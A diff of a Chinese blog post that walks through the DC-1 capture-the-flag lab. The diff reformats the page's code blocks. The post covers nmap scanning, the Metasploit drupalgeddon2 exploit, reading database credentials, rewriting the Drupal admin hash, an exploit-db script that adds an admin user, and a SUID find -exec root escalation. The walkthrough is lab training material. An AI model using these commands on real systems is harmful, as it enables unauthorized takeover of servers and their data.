@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC-1 | You_zip</title><meta name="author" content="Youzipii"><meta name="copyright" content="Youzipii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-1网段：192.168.174.0&#x2F;24 本靶场环境总共有5个flag 1.信息收集1.1. 主机发现nmap -sn 192.168.174.0&#x2F;24或者netdiscover -r 192.168.174.0&#x2F;24  --排除1，2，254   得到目标IP：192.168.174.145 kali的IP：192.168.174.137 1.2. 扫描端口和服务sudo nma">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC-1 | You_zip</title><meta name="author" content="Youzipii"><meta name="copyright" content="Youzipii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-1网段：192.168.174.0&#x2F;24 本靶场环境总共有5个flag 1.信息收集1.1. 主机发现nmap -sn 192.168.174.0&#x2F;24 或者 netdiscover -r 192.168.174.0&#x2F;24  --排除1，2，254   得到目标IP：192.168.174.145 kali的IP：192.168.174.137 1.2. 扫描端口和服务sudo n">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DC-1">
 <meta property="og:url" content="http://example.com/2024/03/20/DC-1/index.html">
 <meta property="og:site_name" content="You_zip">
-<meta property="og:description" content="DC-1网段：192.168.174.0&#x2F;24 本靶场环境总共有5个flag 1.信息收集1.1. 主机发现nmap -sn 192.168.174.0&#x2F;24或者netdiscover -r 192.168.174.0&#x2F;24  --排除1，2，254   得到目标IP：192.168.174.145 kali的IP：192.168.174.137 1.2. 扫描端口和服务sudo nma">
+<meta property="og:description" content="DC-1网段：192.168.174.0&#x2F;24 本靶场环境总共有5个flag 1.信息收集1.1. 主机发现nmap -sn 192.168.174.0&#x2F;24 或者 netdiscover -r 192.168.174.0&#x2F;24  --排除1，2，254   得到目标IP：192.168.174.145 kali的IP：192.168.174.137 1.2. 扫描端口和服务sudo n">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png">
 <meta property="article:published_time" content="2024-03-20T11:30:01.000Z">
@@ -17,7 +17,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  highlight: undefined,
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -155,15 +155,50 @@
       detectApple()
     })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/bk_image/bg3.png')"><nav id="nav"><span id="blog-info"><a href="/" title="You_zip"><span class="site-name">You_zip</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-20T11:30:01.000Z" title="发表于 2024-03-20 19:30:01">2024-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-08T06:56:40.295Z" title="更新于 2024-08-08 14:56:40">2024-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p>
 <p><strong>本靶场环境总共有5个flag</strong></p>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或者</span><br><span class="line">netdiscover -r 192.168.174.0/24  --排除1，2，254</span><br></pre></td></tr></table></figure>
-
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><pre><code class="cnosole">nmap -sn 192.168.174.0/24
+或者
+netdiscover -r 192.168.174.0/24  --排除1，2，254
+</code></pre>
 <p><img src="/../image/image-20240313195746995.png" alt="image-20240313195746995"></p>
 <p>得到目标IP：<strong>192.168.174.145</strong></p>
 <p>kali的IP：<strong>192.168.174.137</strong></p>
-<h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -sV -O -A -p- 192.168.174.145</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36735/udp   status</span><br><span class="line">|   100024  1          42162/tcp6  status</span><br><span class="line">|   100024  1          57533/tcp   status</span><br><span class="line">|_  100024  1          58225/udp6  status</span><br><span class="line">57533/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7E:64:DD (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                     </span><br></pre></td></tr></table></figure>
-
+<h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><pre><code>sudo nmap -T4 -sV -O -A -p- 192.168.174.145
+</code></pre>
+<pre><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-title: Welcome to Drupal Site | Drupal Site
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          36735/udp   status
+|   100024  1          42162/tcp6  status
+|   100024  1          57533/tcp   status
+|_  100024  1          58225/udp6  status
+57533/tcp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:7E:64:DD (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                     
+</code></pre>
 <ul>
 <li>22算口，开放了ssh服务，OpenSSH 6.0p1</li>
 <li>80端口，存在web服务，Apache httpd 2.2.22，Drupal 7</li>
@@ -172,73 +207,87 @@
 <p>补充知识：Drupal由php语言编写的cms，rpcbind是NFS中用来进行消息通知的服务</p>
 <h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="/../image/image-20240313200659949.png" alt="image-20240313200659949"></p>
 <p>可以看到是一个登陆界面，可能存在sql注入漏洞或弱口令，</p>
-<h3 id="1-4-利用MSF渗透"><a href="#1-4-利用MSF渗透" class="headerlink" title="1.4. 利用MSF渗透"></a>1.4. 利用MSF渗透</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSF简单指令</span><br><span class="line">msfconsole		进入MSF控制台</span><br><span class="line">search 			搜索相应模块</span><br><span class="line">use           	对应模块</span><br><span class="line">show options  	查看信息</span><br><span class="line">set RHOST  		远程主机ip</span><br><span class="line">run           	攻击</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-4-1-搜索Drupal-7的漏洞"><a href="#1-4-1-搜索Drupal-7的漏洞" class="headerlink" title="1.4.1. 搜索Drupal 7的漏洞"></a>1.4.1. 搜索Drupal 7的漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Drupa 7</span><br></pre></td></tr></table></figure>
-
+<h3 id="1-4-利用MSF渗透"><a href="#1-4-利用MSF渗透" class="headerlink" title="1.4. 利用MSF渗透"></a>1.4. 利用MSF渗透</h3><pre><code>MSF简单指令
+msfconsole		进入MSF控制台
+search 			搜索相应模块
+use           	对应模块
+show options  	查看信息
+set RHOST  		远程主机ip
+run           	攻击
+</code></pre>
+<h4 id="1-4-1-搜索Drupal-7的漏洞"><a href="#1-4-1-搜索Drupal-7的漏洞" class="headerlink" title="1.4.1. 搜索Drupal 7的漏洞"></a>1.4.1. 搜索Drupal 7的漏洞</h4><pre><code>searchsploit Drupa 7
+</code></pre>
 <p><img src="/../image/image-20240313201413144.png" alt="image-20240313201413144"></p>
 <p>可以发现能利用的漏洞非常多</p>
 <h4 id="1-4-2-进入MSF控制台搜索drupal模块"><a href="#1-4-2-进入MSF控制台搜索drupal模块" class="headerlink" title="1.4.2. 进入MSF控制台搜索drupal模块"></a>1.4.2. 进入MSF控制台搜索drupal模块</h4><p><img src="/../image/image-20240313201539370.png" alt="image-20240313201539370"></p>
 <h4 id="1-4-3-选择模块进行测试"><a href="#1-4-3-选择模块进行测试" class="headerlink" title="1.4.3. 选择模块进行测试"></a>1.4.3. 选择模块进行测试</h4><p>用2018的试试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-4-4-设置靶机IP运行msf"><a href="#1-4-4-设置靶机IP运行msf" class="headerlink" title="1.4.4 设置靶机IP运行msf"></a>1.4.4 设置靶机IP运行msf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.174.145</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
-
+<pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
+</code></pre>
+<h4 id="1-4-4-设置靶机IP运行msf"><a href="#1-4-4-设置靶机IP运行msf" class="headerlink" title="1.4.4 设置靶机IP运行msf"></a>1.4.4 设置靶机IP运行msf</h4><pre><code>set rhosts 192.168.174.145
+run 
+</code></pre>
 <h4 id="1-4-5-进入shell"><a href="#1-4-5-进入shell" class="headerlink" title="1.4.5 进入shell"></a>1.4.5 进入shell</h4><p><img src="/../image/image-20240313201920626.png" alt="image-20240313201920626"></p>
 <p>但不是root权限，不妨先find一下flag问价</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -iname &quot;*flag*&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code>find / -iname &quot;*flag*&quot;
+</code></pre>
 <p><img src="/../image/image-20240313202242817.png" alt="image-20240313202242817"></p>
 <p>有点多，先把带txt的过滤出来</p>
 <p><img src="/../image/image-20240313202404685.png" alt="image-20240313202404685"></p>
 <p>先找一下这三个</p>
 <p><img src="/../image/image-20240313202717938.png" alt="image-20240313202717938"></p>
 <p>可以看到其中只有flag1.txt是我们能访问的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">每个好的CMS都需要一个配置文件——你也一样。</span><br></pre></td></tr></table></figure>
-
+<pre><code>cat /var/www/flag1.txt
+Every good CMS needs a config file - and so do you.
+每个好的CMS都需要一个配置文件——你也一样。
+</code></pre>
 <p>通过这个线索我们可以区找一下这个cms的配置文件，但这个界面确实不怎么好看，使用python反弹一个交互式shell TTY。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)
+</code></pre>
 <p><img src="/../image/image-20240313203341574.png" alt="image-20240313203341574"></p>
 <p>搜索发现drupal的配置文件是 &#x2F;sites&#x2F;default&#x2F;settings.php ，是数据库连接配置文件。</p>
 <p>去看一下能不能看到这个文件的信息</p>
 <p><img src="/../image/image-20240313203955072.png" alt="image-20240313203955072"></p>
 <p>可以看到数据库的账号密码,英文意思如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破攻击和字典攻击不是</span><br><span class="line">获得访问权限的唯一方法(您将需要访问权限)。</span><br><span class="line">你能用这些证书做什么?</span><br></pre></td></tr></table></figure>
-
+<pre><code>爆破攻击和字典攻击不是
+获得访问权限的唯一方法(您将需要访问权限)。
+你能用这些证书做什么?
+</code></pre>
 <h4 id="登陆数据库"><a href="#登陆数据库" class="headerlink" title="登陆数据库"></a>登陆数据库</h4><p><strong>Drupal框架默认的用户表就是users表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -pR0ck3t</span><br><span class="line">show databses; --发现drup数据库</span><br><span class="line">show tables; --发现users表</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="mysql">mysql -u dbuser -pR0ck3t
+show databses; --发现drup数据库
+show tables; --发现users表
+select * from users;
+</code></pre>
 <p><img src="/../image/image-20240313204216786.png" alt="image-20240313204216786"></p>
 <p>发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal 6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。</p>
 <p>这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。</p>
 <h5 id="方法一重置密码"><a href="#方法一重置密码" class="headerlink" title="方法一重置密码"></a>方法一重置密码</h5><p><img src="/../image/image-20240313205708345.png" alt="image-20240313205708345"></p>
 <p>不知道为什么我用这个会报错说文件包含</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456</span><br><span class="line">php ./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">password: 123456                hash: $S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa</span><br></pre></td></tr></table></figure>
+<pre><code>www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456
+php ./scripts/password-hash.sh 123456
 
-
-
+password: 123456                hash: $S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa
+</code></pre>
 <p>原来要在根目录下使用</p>
 <p>在指定目录下执行脚本是为了确保脚本能够正确加载所需的文件和依赖项。在Drupal中，脚本需要包含Drupal的核心文件和库才能生成正确的密码哈希。一般情况下，Drupal的根目录包含<code>index.php</code>文件和<code>sites</code>目录。</p>
 <p>得到后，再把他写入数据库中</p>
 <p>mysql -h是MySQL命令行客户端中的参数，用于指定要连接的MySQL服务器的主机名或IP地址。在命令行中，-h后面可以跟上要连接的MySQL服务器的主机名或IP地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u dbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
-
+<pre><code>mysql -h localhost -u dbuser -pR0ck3t
+</code></pre>
 <p>然后把密码写如user表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass=&quot;$S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="msyql">update users set pass=&quot;$S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa&quot; where name=&quot;admin&quot;;
+</code></pre>
 <p><img src="/../image/image-20240313211312372.png" alt="image-20240313211312372"></p>
 <p><img src="/../image/image-20240313211331364.png" alt="image-20240313211331364"></p>
 <h5 id="方法二，利用漏洞添加admin用户"><a href="#方法二，利用漏洞添加admin用户" class="headerlink" title="方法二，利用漏洞添加admin用户"></a>方法二，利用漏洞添加admin用户</h5><p><img src="/../image/image-20240313213434032.png" alt="image-20240313213434032"></p>
 <p>但有版本要求，所以我们需要先查看drupal的版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>
-
+<pre><code>cat /var/www/includes/bootstrap.inc | grep VERSION
+</code></pre>
 <p><img src="/../image/image-20240313214051628.png" alt="image-20240313214051628"></p>
 <p>7.21是可以利用该漏洞的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.145 -u youzipii -p 123123</span><br><span class="line">需要注意用python3会报错，要用python2执行</span><br></pre></td></tr></table></figure>
-
+<pre><code>python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.145 -u youzipii -p 123123
+需要注意用python3会报错，要用python2执行
+</code></pre>
 <p><img src="/../image/image-20240313214725060.png"></p>
 <p><img src="/../image/image-20240313214901260.png" alt="image-20240313214901260"></p>
 <p>可以看到也登陆进来了</p>
@@ -255,8 +304,11 @@
 <h4 id="1-4-8-提权-获得最终flag"><a href="#1-4-8-提权-获得最终flag" class="headerlink" title="1.4.8 提权+获得最终flag"></a><strong>1.4.8 提权+获得最终flag</strong></h4><p><img src="/../image/image-20240313215633609.png" alt="image-20240313215633609"></p>
 <p>下面就是提权了</p>
 <p>根据flag3中的提示，使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find ./ acce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br><span class="line">2. <span class="built_in">touch</span> bcce有可能不能创建</span><br><span class="line">find bcce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">1. find ./ acce -exec &#39;/bin/sh&#39; \;
 
+2. touch bcce有可能不能创建
+find bcce -exec &#39;/bin/sh&#39; \;
+</code></pre>
 <p><img src="/../image/image-20240313215833812.png" alt="image-20240313215833812"></p>
 <p>访问最后一个flag</p>
 <p><img src="/../image/image-20240313215921134.png" alt="image-20240313215921134"></p>
